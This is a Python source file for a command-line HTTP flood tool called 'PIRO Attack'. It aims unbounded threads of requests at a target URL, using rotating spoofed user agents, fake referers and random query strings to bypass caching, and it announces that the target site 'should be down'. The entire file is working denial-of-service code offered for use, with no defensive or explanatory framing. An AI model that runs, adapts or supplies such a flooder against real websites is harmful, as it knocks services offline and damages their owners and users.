import random
import string
import threading
import requests
import argparse
from rich.console import Console
from rich.traceback import install

install()


class PiroAttack:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
            "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
            "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
            "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        ]
        self.headers_referers = [
            "http://www.google.com/?q=",
            "http://www.usatoday.com/search/results?q=",
            "http://engadget.search.aol.com/search?q=",
        ]
        self.accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
        self.max_threads = 250000000000
        self.console = Console()
        self.cur_threads = 0
        
    def generate_random_params(self):
        return "".join(random.choices(string.ascii_letters, k=random.randint(3, 10)))

    def generate_random_headers(self):
        return {
            "User-Agent": random.choice(self.user_agents),
            "Cache-Control": "no-cache",
            "Accept-Charset": self.accept_charset,
            "Referer": random.choice(self.headers_referers) + self.generate_random_params(),
            "Keep-Alive": str(random.randint(100, 500)),
            "Connection": "keep-alive"
        }

    def make_request(self, url, data, custom_headers):
        headers = {**self.generate_random_headers(),**custom_headers}
        try:  
            requests.post(url,data=data,headers=headers)if data else requests.get(url+"?"+self.generate_random_params(),headers=headers)
            self.cur_threads += 1
        except:  
            self.cur_threads -= 1
            self.console.print("[red]Error: Connection Timeout[/red]")
        else:
            self.console.print(f"[cyan]Requests Sent: {self.cur_threads}[/cyan]",style="bold",end="\r")


    def overload_site(self, url):
        try:
            self.console.print(f"[bold blue]Starting Overload Attack on {url} with {self.max_threads} threads[/]")
            while True:
                thread = threading.Thread(target=self.make_request, args=(url, None, {}))
                thread.start()
                if self.cur_threads > self.max_threads:
                    break
            self.console.print("[green bold]Attack finished. Target site should be down.[/]")

        except Exception as e:
            self.console.print(f"[red bold]Error in attack: {e}[/red bold]")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PIRO Attack")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-d", "--data", help="Data to POST")
    parser.add_argument("-H", "--headers", help="Custom headers")
    args = parser.parse_args()
    attack = PiroAttack()
    try:
        attack.overload_site(args.url)
    except KeyboardInterrupt:
        attack.console.print("[red]-- Interrupted by user --[/red]")
